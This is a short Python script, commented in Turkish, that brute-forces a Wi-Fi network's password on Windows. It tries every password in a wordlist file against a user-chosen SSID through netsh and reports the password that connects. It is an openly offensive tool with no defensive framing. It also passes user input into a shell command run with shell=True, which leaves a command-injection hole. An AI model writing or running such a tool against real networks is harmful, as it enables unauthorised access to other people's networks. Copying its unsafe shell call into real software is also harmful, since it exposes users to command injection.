import subprocess
import time

def connect_to_wifi(ssid, password):
    # Windows için WiFi ağına bağlanmayı dener
    cmd = f'netsh wlan connect name="{ssid}" key="{password}"'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    return "başarıyla" in result.stdout.lower() or "successfully" in result.stdout.lower()

def main():
    ssid = input("Bağlanmak istediğin WiFi adı (SSID): ")
    
    with open("passwords.txt", "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f.readlines()]
    
    for password in passwords:
        print(f"Deniyorum: {password}")
        success = connect_to_wifi(ssid, password)
        time.sleep(3)  # Bağlantının kurulması için 3 saniye bekle
        
        if success:
            print(f"Şifre bulundu! -> {password}")
            break
    else:
        print("Hiçbir şifre ile bağlantı kurulamadı.")

if __name__ == "__main__":
    main()
